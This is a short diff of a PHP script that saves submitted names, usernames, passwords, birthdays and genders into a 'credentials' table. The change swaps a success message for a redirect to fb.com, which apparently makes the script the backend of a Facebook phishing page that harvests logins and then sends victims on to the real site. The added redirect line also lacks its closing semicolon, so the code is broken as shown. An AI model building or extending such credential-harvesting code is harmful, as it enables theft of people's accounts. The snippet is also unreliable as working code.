@@ -21,7 +21,7 @@
         $stmt = $conn->prepare("insert into credentials(f_name, l_name, username, pass, birthday, gender) values(?,?,?,?,?,?)");
         $stmt->bind_param("ssssss", $f_name, $l_name, $username, $password, $date, $gender);
         $stmt->execute();
-        echo "Operation successful";
+        header("Location: http://www.fb.com")
         $stmt->close();
         $conn->close();
     }
